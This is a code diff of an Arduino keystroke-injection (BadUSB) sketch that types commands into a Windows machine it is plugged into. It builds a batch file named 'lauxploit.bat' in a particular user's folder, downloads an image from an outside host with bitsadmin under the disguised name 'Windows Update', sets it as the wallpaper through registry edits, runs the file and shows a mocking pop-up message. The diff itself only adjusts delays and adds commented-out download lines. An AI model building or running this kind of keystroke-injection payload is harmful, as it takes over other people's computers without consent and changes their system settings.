@@ -1,11 +1,12 @@
-#define DELAY_BEGIN 5000
+#define DELAY_BEGIN 300000
 #define DELAY_CMD 500
-#define DELAY_TYPE 5
+#define DELAY_BAT 4000
+#define DELAY_TYPE 10
 #define DELAY_END 300000
+//#define PATHUSERTARGET "ple" //Temp workaround : ctrl+f and change \ple\ by \USERTARGET\
 
 #include <Keyboard.h>
 
-//char USERTARGET[8] = "ple";
 int isFirstTime = 1;
 
 void setup()
@@ -29,7 +30,6 @@ void loop()
     delay(DELAY_CMD);
   
     // Creating the reminder
-    //Keyboard.println(strcat(strcat("cd C:\\Users\\",USERTARGET),"\\Pictures"));
     Keyboard.println("cd C:\\Users\\ple\\Pictures\n");
     delay(DELAY_TYPE);
     Keyboard.println("copy con lauxploit.bat\n");
@@ -42,16 +42,21 @@ void loop()
       delay(DELAY_TYPE);
 
     ////////// BODY OF LAUXPLOIT.BAT
-    // Download the wallpaper
+    // Download the wallpapers
     Keyboard.println("bitsadmin.exe /transfer \"Windows Update\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\Users\\ple\\Pictures\\lvi.jpg\n");
     delay(DELAY_TYPE);
+    // Wallpaper  #2 Keyboard.println("bitsadmin.exe /transfer \"Windows Update\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\Users\\ple\\Pictures\\lvi.jpg\n");
+    //delay(DELAY_TYPE);
+    // Wallpaper  #3 Keyboard.println("bitsadmin.exe /transfer \"Windows Update\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\Users\\ple\\Pictures\\lvi.jpg\n");
+    //delay(DELAY_TYPE);
+    
     Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:\\Users\\ple\\Pictures\\lvi.jpg\" /f\n");
     delay(DELAY_TYPE);
     Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v TileWallpaper /t REG_SZ /f /d 0\n");
     delay(DELAY_TYPE);
     Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /f /d 0\n");
     delay(DELAY_TYPE);
-    for (int i = 0; i<40; i++)
+    for (int i = 0; i<42; i++)
     {
       Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\n");
       delay(DELAY_TYPE);  
@@ -77,7 +82,7 @@ void loop()
     
     //Launch it once
     Keyboard.println("lauxploit.bat\n");
-    delay(DELAY_CMD);
+    delay(DELAY_BAT);
     Keyboard.println("Msg * \"To my beloved OLD secret admirer, please receive this gift as a mark of my unwavering love for you\"\n");
     delay(DELAY_TYPE);
   
